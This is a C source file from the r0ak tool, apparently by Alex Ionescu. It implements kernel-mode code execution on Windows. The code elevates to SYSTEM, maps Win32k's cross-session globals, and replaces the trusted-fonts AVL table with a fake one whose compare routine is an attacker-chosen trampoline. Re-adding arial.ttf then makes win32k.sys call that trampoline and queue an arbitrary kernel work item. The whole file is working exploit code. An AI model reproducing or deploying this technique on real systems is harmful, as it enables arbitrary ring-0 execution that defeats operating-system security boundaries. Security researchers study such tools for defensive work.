/*++

Copyright (c) Alex Ionescu.  All rights reserved.

Module Name:

    r0akexec.c

Abstract:

    This module implements the kernel-mode execution engine for r0ak

Author:

    Alex Ionescu (@aionescu) 21-Jul-2018 - First public version

Environment:

    User mode only.

--*/

#include "r0ak.h"

typedef struct _CONTEXT_PAGE
{
    RTL_BALANCED_LINKS Header;
    UCHAR Reserved[0x50];
    WORK_QUEUE_ITEM WorkItem;
} CONTEXT_PAGE, *PCONTEXT_PAGE;

//
// Tracks execution state between calls
//
typedef struct _KERNEL_EXECUTE
{
    PXSGLOBALS Globals;
    PKERNEL_ALLOC TrampolineAllocation;
    PRTL_BALANCED_LINKS TrampolineParameter;
} KERNEL_EXECUTE, *PKERNEL_EXECUTE;

_Success_(return != 0)
BOOL
KernelExecuteRun (
    _In_ PKERNEL_EXECUTE KernelExecute
    )
{
    PRTL_AVL_TABLE realTable, fakeTable;
    BOOL b;

    //
    // Remember original pointer
    //
    realTable = KernelExecute->Globals->TrustedFontsTable;

    //
    // Remove arial, which is our target font
    //
    b = RemoveFontResourceExW(L"C:\\windows\\fonts\\arial.ttf", 0, NULL);
    if (b == 0)
    {
        printf("[-] Failed to remove font: %lx\n", GetLastError());
        return b;
    }

    //
    // Save the original trusted font file table and overwrite it with our own.
    //
    fakeTable = (PRTL_AVL_TABLE)((KernelExecute->Globals) + 1);
    fakeTable->BalancedRoot.RightChild = KernelExecute->TrampolineParameter;
    KernelExecute->Globals->TrustedFontsTable = fakeTable;

    //
    // Set our priority to 4, the theory being that this should force the work
    // item to execute even on a single-processor core
    //
    SetThreadPriority(GetCurrentThread(), THREAD_MODE_BACKGROUND_BEGIN);

    //
    // Add a font -- Win32k.sys will check if it's in the trusted path,
    // triggering the AVL search. This will trigger the execute.
    //
    b = AddFontResourceExW(L"C:\\windows\\fonts\\arial.ttf", 0, NULL);
    if (b == 0)
    {
        printf("[-] Failed to add font: %lx\n", GetLastError());
    }

    //
    // Restore original pointer and thread priority
    //
    KernelExecute->Globals->TrustedFontsTable = realTable;
    SetThreadPriority(GetCurrentThread(), THREAD_MODE_BACKGROUND_END);
    return b;
}

VOID
KernelExecuteTeardown (
    _In_ PKERNEL_EXECUTE KernelExecute
    )
{
    //
    // Free the trampoline context
    //
    KernelFree(KernelExecute->TrampolineAllocation);

    //
    // Unmap the globals
    //
    UnmapViewOfFile(KernelExecute->Globals);

    //
    // Free the context
    //
    HeapFree(GetProcessHeap(), 0, KernelExecute);
}

_Success_(return != 0)
BOOL
KernelExecuteSetup (
    _Outptr_ PKERNEL_EXECUTE* KernelExecute,
    _In_ PVOID TrampolineFunction
    )
{
    PRTL_AVL_TABLE fakeTable;
    BOOL b;
    NTSTATUS status;
    HANDLE hFile;
    UNICODE_STRING name;
    OBJECT_ATTRIBUTES objectAttributes;

    //
    // Callers can't pass NULL
    //
    if (KernelExecute == NULL)
    {
        return FALSE;
    }

    //
    // Initialize the context
    //
    *KernelExecute = HeapAlloc(GetProcessHeap(),
                               HEAP_ZERO_MEMORY,
                               sizeof(**KernelExecute));
    if (*KernelExecute == NULL)
    {
        printf("[-] Out of memory allocating execution tracker\n");
        return FALSE;
    }

    //
    // Get a SYSTEM token
    //
    b = ElevateToSystem();
    if (b == FALSE)
    {
        printf("[-] Failed to elevate to SYSTEM privileges\n");
        HeapFree(GetProcessHeap(), 0, *KernelExecute);
        return FALSE;
    }

    //
    // Open a handle to Win32k's cross-session globals section object
    //
    RtlInitUnicodeString(&name, L"\\Win32kCrossSessionGlobals");
    InitializeObjectAttributes(&objectAttributes,
                               &name,
                               OBJ_CASE_INSENSITIVE,
                               NULL,
                               NULL);
    status = ZwOpenSection(&hFile, MAXIMUM_ALLOWED, &objectAttributes);

    //
    // We can drop impersonation now
    //
    b = RevertToSelf();
    if (b == FALSE)
    {
        //
        // Not much to do but trace
        //
        printf("[-] Failed to revert impersonation token: %lX\n",
               GetLastError());
    }

    //
    // Can't keep going if we couldn't get a handle to the section
    //
    if (!NT_SUCCESS(status))
    {
        printf("[-] Couldn't open handle to kernel execution block: %lx\n",
               status);
        CloseHandle(hFile);
        HeapFree(GetProcessHeap(), 0, *KernelExecute);
        return FALSE;
    }

    //
    // Map the section object in our address space
    //
    (*KernelExecute)->Globals = MapViewOfFile(hFile,
                                              FILE_MAP_ALL_ACCESS,
                                              0,
                                              0,
                                              sizeof((*KernelExecute)->Globals));
    CloseHandle(hFile);
    if ((*KernelExecute)->Globals == NULL)
    {
        printf("[-] Couldn't map kernel execution block: %lx\n",
               GetLastError());
        HeapFree(GetProcessHeap(), 0, *KernelExecute);
        return FALSE;
    }

    //
    // Setup the table
    //
    printf("[+] Mapped kernel execution block at                     0x%.16p\n",
           (*KernelExecute)->Globals);
    fakeTable = (PRTL_AVL_TABLE)((*KernelExecute)->Globals + 1);
    fakeTable->DepthOfTree = 1;
    fakeTable->NumberGenericTableElements = 1;
    fakeTable->CompareRoutine = TrampolineFunction;
    return TRUE;
}

_Success_(return != 0)
BOOL
KernelExecuteSetCallback (
    _In_ PKERNEL_EXECUTE KernelExecute,
    _In_ PVOID WorkFunction,
    _In_ PVOID WorkParameter
    )
{
    PCONTEXT_PAGE contextBuffer;
    PKERNEL_ALLOC kernelAlloc;

    //
    // Allocate the right child page that will be sent to the trampoline
    //
    contextBuffer = KernelAlloc(&kernelAlloc, sizeof(*contextBuffer));
    if (contextBuffer == NULL)
    {
        printf("[-] Failed to allocate memory for WORK_QUEUE_ITEM\n");
        return FALSE;
    }

    //
    // Fill out the worker and its parameter
    //
    contextBuffer->WorkItem.WorkerRoutine = WorkFunction;
    contextBuffer->WorkItem.Parameter = WorkParameter;

    //
    // Write into the buffer
    //
    contextBuffer = (PCONTEXT_PAGE)KernelWrite(kernelAlloc);
    if (contextBuffer == NULL)
    {
        KernelFree(kernelAlloc);
        printf("[-] Failed to find kernel memory for WORK_QUEUE_ITEM\n");
        return FALSE;
    }

    //
    // Return the balanced links with the appropriate work item
    //
    KernelExecute->TrampolineAllocation = kernelAlloc;
    KernelExecute->TrampolineParameter = &contextBuffer->Header;
    return TRUE;
}
